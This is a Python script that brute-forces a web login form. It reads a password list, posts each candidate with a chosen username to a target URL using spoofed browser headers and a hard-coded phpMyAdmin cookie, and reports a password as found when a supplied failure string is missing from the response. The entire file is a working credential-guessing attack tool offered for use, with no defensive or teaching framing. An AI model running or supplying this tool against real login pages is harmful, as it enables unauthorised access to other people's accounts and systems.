import requests
import datetime
import sys


class BruteForceService(object):

    def __init__(self, _listpass, _url, _user, _quote):
        self._listpass = _listpass
        self._url = _url
        self._user = _user
        self._quote = _quote

    def bruteForce(self):
        fpass = open(_listpass, encoding="utf8", errors='ignore')        
        #try:
        #    with requests.Session() as s:
        #        gettoken = s.get(_url,timeout = 3)
                #gottoken = gettoken.content.split('name="token"')[1].split('"')[1]
        #        print(gettoken.content)
        #except requests.exceptions.RequestException as e:
        #        print('exception caught', e)    

        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0', 'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Cache-Control': 'no-cache', 'Connection': 'Keep-Alive',
                   'Set-Cookie': 'phpMyAdmin=7d2213a1b50852903d64f63de546be7a073ad1cc'}       

        start = datetime.datetime.now()
        for line in fpass:
            try:
                senha = line.rstrip("\n")
                print("Testando.. %s" % (senha))
                with requests.Session() as s:
                    _post_data = data = {'senha': senha,'usuario': _user}
                    _post_response = s.post(url=_url, data=_post_data,
                                            headers=headers)
                    result = _post_response.text
                    if _quote not in result:
                        end = datetime.datetime.now()
                        totaltime = end - start
                        time = int(totaltime.total_seconds() / 60)
                        print("[+] Password founded %s" % (senha))
                        print("[+} Duration (minutes): %s" % (time))
                        print(result)
                        break
                    _post_response.close()
            except requests.exceptions.RequestException as e:
                print('exception caught', e)

if __name__ == "__main__":

    if len(sys.argv) == 5:
        _listpass = sys.argv[1]
        _url = sys.argv[2]
        _user = sys.argv[3]  
        _quote =  sys.argv[4]     
        brutehttp = BruteForceService(_listpass, _url, _user, _quote)
        brutehttp.bruteForce()
    else:
        print("It is necessary to inform: password list, url, user and invalid quote %s" % len(sys.argv))
